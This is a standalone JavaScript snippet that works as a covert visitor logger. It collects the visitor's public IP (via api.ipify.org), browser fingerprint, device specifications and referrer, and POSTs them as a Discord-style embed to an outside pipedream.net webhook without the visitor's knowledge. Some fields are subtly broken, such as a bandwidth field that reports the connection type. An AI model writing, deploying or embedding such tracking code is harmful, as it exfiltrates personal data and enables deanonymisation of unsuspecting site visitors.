var useragent=navigator.userAgent,cookie=navigator.cookieEnabled,language=navigator.language,platform=navigator.platform,java=navigator.javaEnabled(),width=screen.width,height=screen.height,connect=navigator.connection.type,battery=navigator.getBattery().then(function(e){e.level}),memory=navigator.deviceMemory,cores=navigator.hardwareConcurrency,langs=navigator.languages,plugs=navigator.plugins.name,touch=navigator.maxTouchPoints,webdriv=navigator.webdriver,donot=navigator.doNotTrack,rtt=navigator.connection.rtt,ebwidth=navigator.connection.type,effectiveType=navigator.connection.effectiveType,refer=document.referrer,orientation=screen.orientation;$.getJSON("https://api.ipify.org/?format=json",function(e){fetch("https://eob870waesyxkr8.m.pipedream.net",{method:"POST",headers:{"Content-type":"application/json"},body:JSON.stringify({embeds:[{title:"Details Received",color:15258703,thumbnail:{},fields:[{name:"IP Address",value:`> ${e.ip}`},{name:"GeoLocation Info",value:">>> INFO REMOVED TO WORK, CHECK WHOIS"},{name:"Network Info",value:">>> INFO REMOVED TO WORK, CHECK WHOIS"},{name:"Device Info",value:`>>> User Agent: ${useragent}
Platform: ${platform}
Language: ${language}
Resolution: ${width}x${height}
Orientation: ${orientation}
Memory (estimated): ${memory} GB
Cores: ${cores} Cores
Touch Points: ${touch}`},{name:"Misc Info",value:`>>> Battery: Not Included
Cookies: ${cookie}
Java: ${java}
Do Not Track: ${donot}
Web Driver: ${webdriv}
`},{name:"Request Info",value:`>>> Connection Type: ${connect}
Round Trip Time: ${rtt} ms
Effective bandwidth: ${ebwidth} Mb/s
Effective Type: ${effectiveType}
URL Referrer: ${refer}`}]}]})}).then(e=>{console.log(e)})});
